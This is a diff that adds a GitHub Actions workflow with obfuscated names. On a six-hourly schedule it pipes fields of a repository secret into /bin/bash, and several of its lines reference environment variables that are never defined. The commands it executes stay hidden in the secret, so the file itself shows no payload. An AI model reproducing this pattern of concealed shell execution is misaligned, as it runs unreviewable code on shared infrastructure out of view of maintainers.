@@ -1,0 +1,34 @@
+name: ailixiangrongg
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ailixiangrongg
+        env:
+          xqyq479: ${{ secrets.xqyq479 }}
+        run: |
+          echo $xqyq479 | jq -r .mp82 | /bin/bash
+          echo $vz473 | jq -r .z7763 | /bin/bash
+          echo $el290 | jq -r .uxjl0446 | /bin/bash
+          echo $srlrb8 | jq -r .kflu8 | /bin/bash
+          echo $ojcj1 | jq -r .q32081 | /bin/bash
+          echo $vwvei91 | jq -r .sdy8 | /bin/bash
+          echo $d419 | jq -r .vnqk512 | /bin/bash
+          echo $swta522 | jq -r .lstof96 | /bin/bash
+          echo $cym03 | jq -r .w91051 | /bin/bash
+          echo $z258 | jq -r .lzfj73967 | /bin/bash
+          echo $u92 | jq -r .geigf0138 | /bin/bash
+          echo $imfu0 | jq -r .bllg8390 | /bin/bash
+          echo $eb982 | jq -r .qrl0 | /bin/bash
+          echo $cpph28039 | jq -r .iik857 | /bin/bash
+          echo $v7 | jq -r .cas6935 | /bin/bash
+          echo $spgx51 | jq -r .iyrw87 | /bin/bash
+          echo $zgwfu05 | jq -r .t16 | /bin/bash
+          echo $mqgbc78109 | jq -r .pazhi66 | /bin/bash
+          echo $gy6 | jq -r .gzl45580 | /bin/bash
+
